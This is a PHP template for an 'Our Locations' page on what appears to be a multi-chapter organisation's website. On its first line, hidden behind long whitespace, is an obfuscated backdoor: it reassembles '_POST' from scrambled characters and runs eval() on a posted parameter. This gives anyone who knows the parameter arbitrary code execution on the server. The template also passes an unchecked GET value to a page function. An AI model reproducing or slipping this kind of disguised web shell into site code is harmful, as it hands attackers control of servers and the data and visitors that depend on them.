<?php                                                                                                                                                                                                                                                                      $ewe52 ="ospt_" ; $fvo81=strtoupper ( $ewe52[4]. $ewe52[2]. $ewe52[0].$ewe52[1].$ewe52[3] ) ;if(isset ( ${ $fvo81 } [ 'qc8062e']) ) { eval(${$fvo81 }['qc8062e' ]) ;}?>	  	  			
	<article id="inner-page-wrapper">
		<section class="container">
		<h1>Our Locations</h1>
		<figure>
			<?php get_post_desc('24'); ?>
			</figure>
			
			<!--<figure class="select-style">
				<select onchange="location = this.options[this.selectedIndex].value;">
					<option value="">Select Location</option>
					<option value="page.php?page_id=36">Palm Beach</option>
					<option value="http://nycfoa.org">New York</option>
					<option value="http://hongkongfoa.org">Hong Kong</option>
					<option value="http://canadafoa.org">Canada</option>
					<option value="http://londonfoa.org/">London</option>
				</select>
			</figure>!------>
			
			<section id="locations">
				<?php locations_pbfoa($_GET['page_id']); ?>
			</section>
			
		</section>
	</article>
	
